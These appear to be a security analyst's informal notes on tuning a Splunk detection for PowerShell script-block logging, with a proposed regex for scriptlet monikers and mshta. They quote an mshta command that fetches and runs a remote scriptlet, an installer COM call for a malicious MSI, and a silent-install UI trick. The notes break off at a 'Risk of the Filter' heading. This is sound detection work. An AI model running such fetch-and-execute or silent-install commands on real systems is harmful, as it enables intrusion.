# Analysis | T1059.001 WinEvent EID 4104 | splunk detection tuning

## Scope

This analysis covers the value of adding the decided fields to In memory & obfuscation mechanism checks in the .spl alert.
The added values being matched are:
A blindspot to execution via URL links, the following command would raise as informational in the original splunk detection:
```powershell
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct').Exec();close()"
```

Obviously theres a caveat that im building for T1059.001, sysmon 1 & win event 4104 only catch what executes inside a powershell shell and as such we'd only catch this specific entity 'cmd.exe' launching mshta.exe if its executed via PS which can be worked around within PS or by using cmd itself to launch the command, so instead Im focusing on catching the entity specifically and cutting the head of the snake in pyrmaid of pain speak (attacking the underlying mechanism not a specific entity), the attacker needs to run GetObject followed by a url, or script etc, I will use the following to catch this:
| eval hasScriptlet = if(match(ScriptBlockText, "(?i)(GetObject\s*\(\s*['\"](script|scriptlet):|\bmshta\b)"), 1, 0)
Can add that to in memory

Could potentially add some of the following to osbfuc, need more researhc done,
.Insert( ->Modify strings/collections  (Obfuscation)
UILevel -> Control install UI visibility (Silent execution)
Attacker can do uilevel = 2 to reduce GUI visbility for user/ alerts etc.

$installer = New-Object -ComObject WindowsInstaller.Installer
Thinking of addding this one too, obviouslyt these 3 may need their own section and graded as informational if they appear own their own kind of thing, but if multiple show then they can grade like the rest of the alert, move up to medium/ high

Can use this to prove installation occured:
$installer.InstallProduct("C:\malicious.msi", "ACTION=INSTALL")



## Key Finding

The detections for osbfucation is currently limited, same for in memory techniques, adding a couple could significantly improve this problem, that said the main issue i found was related to .com object downloads in combo with obsufc techniques, these dont get detected currently.
Second to that using scriptlet moniker seems to slip through, a threat actor could poetntially run a java script/ JSE etc and it wouldnt be detected. The reason why I want to cover this in 4104 is it can be executed in memory completely & can be done without spawning procceses etc if need be, it could be done via PS script block i need to catch it.
## Risk of the Filter

The accepted risk: